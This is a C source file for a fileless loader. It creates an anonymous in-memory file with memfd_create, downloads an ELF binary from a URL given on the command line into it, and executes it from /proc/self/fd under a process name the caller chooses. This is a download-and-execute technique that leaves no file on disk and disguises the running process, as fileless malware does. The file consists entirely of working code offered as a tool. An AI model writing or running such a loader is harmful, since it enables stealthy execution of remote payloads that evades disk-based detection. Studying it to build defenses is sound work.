/* Uses an anonymous file descriptor in order to load an ELF from memory.
 * The memfd_create(2) function is used to create a file descriptor in memory
 * to which the specified file is copied to.
 *
 * More info: http://gg.gg/ok98c 
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>


// creates anonymous file descriptor
int create_afd(void) {
    int afd;
   
    afd = memfd_create("", MFD_CLOEXEC); // closes file descriptor on execution

    if (afd < 0) {
        fprintf(stderr, "error creating file descriptor");
        exit(-1);
     }

    return afd;
}

// Callback function for writing to anonymous file descriptor 
size_t write_to_mem(void *ptr, size_t size, size_t nmemb, int afd) {
    if (write(afd, ptr, nmemb) <0) {
        fprintf(stderr, "[-] Error while attempting to write to file\n");
        close(afd);
        exit(-1);
    }
}

// copy file to anonymous file descriptor from network
int curl_to_mem(int afd, char *url) {
    
    CURL *curl;
    CURLcode res;

    printf("Copying file to memory from URL: %s\n", url);
   
    // make use of libcurl to download the file  
    curl = curl_easy_init();
    if (curl) {
       curl_easy_setopt(curl, CURLOPT_URL, url);
       curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_mem);
       curl_easy_setopt(curl, CURLOPT_WRITEDATA, afd);
        
    // make HTTP request 
       res = curl_easy_perform(curl);
       if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
           fprintf(stderr, "[-] Error: %s\n", curl_easy_strerror(res));
           exit(-1);
       }
       curl_easy_cleanup(curl);
       return 0;
    }
}

int main(int argc, char *argv[]) {
    
    int afd;
    pid_t pid;
    char *path;
    char ch;
    
    
    if (argc < 3) {
    printf("usage: memloadn [url] [process name]\n");
    exit(-1);
    }
    
    afd = create_afd();
    
    curl_to_mem(afd, argv[1]);

    // get path to anonymous file descriptor
    pid = getpid();
    asprintf(&path, "/proc/self/fd/%i", afd);
    
    /* wait for user input to continue.
     * leaving the program in this state will keep the file descriptor open and
     * allow you to execute the binary from memory.
     *'/proc/<PID>/fd/<FD>'
     */
    printf("Created process with PID: %d\n", pid);
    printf("Binary: /proc/%d/fd/%i\n", pid, afd);
    ch = getchar();
    
    /*Execute binary closing file descriptor, process name will be second 
     *argument of execl(). 
     */
    execl(path, argv[2], NULL);

    return 0;
 }

